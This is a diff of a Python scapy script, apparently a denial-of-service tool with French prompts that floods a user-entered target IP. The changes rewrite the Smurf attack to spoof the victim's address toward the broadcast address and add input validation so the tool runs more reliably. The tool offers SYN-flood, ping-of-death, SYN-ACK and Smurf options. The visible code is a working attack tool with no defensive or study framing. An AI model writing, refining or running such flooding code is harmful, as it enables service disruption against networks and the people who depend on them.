@@ -1,6 +1,7 @@
 from scapy.all import IP, ICMP, TCP, send, Raw
 import random
 import time
+import sys
 
 def generate_random_ip():
     """Generate a random IPv4 address."""
@@ -37,10 +38,10 @@ def attack_syn_ack(target_ip, target_port, num_packets, delay):
         send_packet(packet, delay)
 
 def attack_smurf(target_ip, num_packets, delay):
-    """Send Smurf attack (ICMP flood using victim's IP as source)."""
+    """Send Smurf attack (ICMP flood using target's IP as source)."""
+    broadcast_ip = "255.255.255.255"  # Using a broadcast address for Smurf attack
     for _ in range(num_packets):
-        src_ip = generate_random_ip()
-        packet = IP(src=src_ip, dst=target_ip) / ICMP()
+        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()  # Source is target, destination is broadcast
         send_packet(packet, delay)
 
 def ddos(target_ip, attack_type, num_packets, delay):
@@ -61,9 +62,18 @@ def ddos(target_ip, attack_type, num_packets, delay):
 if __name__ == "__main__":
     # Demander les informations à l'utilisateur
     target_ip = input("Entrez l'adresse IP cible : ")
-    attack_type = input("Entrez le type d'attaque (syn_flood, pod, syn_ack, smurf) : ")
-    num_packets = int(input("Entrez le nombre de paquets à envoyer : "))
-    delay = float(input("Entrez le délai entre les paquets (en secondes, 0 pour aucun délai) : "))
+    attack_type = input("Entrez le type d'attaque (syn_flood, pod, syn_ack, smurf) : ").lower()
+    
+    # Valider l'entrée de type d'attaque
+    if attack_type not in ["syn_flood", "pod", "syn_ack", "smurf"]:
+        print("Type d'attaque non reconnu. Choisissez parmi: syn_flood, pod, syn_ack, smurf.")
+        sys.exit(1)
+    
+    try:
+        num_packets = int(input("Entrez le nombre de paquets à envoyer : "))
+        delay = float(input("Entrez le délai entre les paquets (en secondes, 0 pour aucun délai) : "))
 
-    # Lancer l'attaque avec les paramètres choisis
-    ddos(target_ip, attack_type, num_packets, delay) 
+        # Lancer l'attaque avec les paramètres choisis
+        ddos(target_ip, attack_type, num_packets, delay)
+    except ValueError:
+        print("Veuillez entrer des valeurs numériques valides pour le nombre de paquets et le délai.")
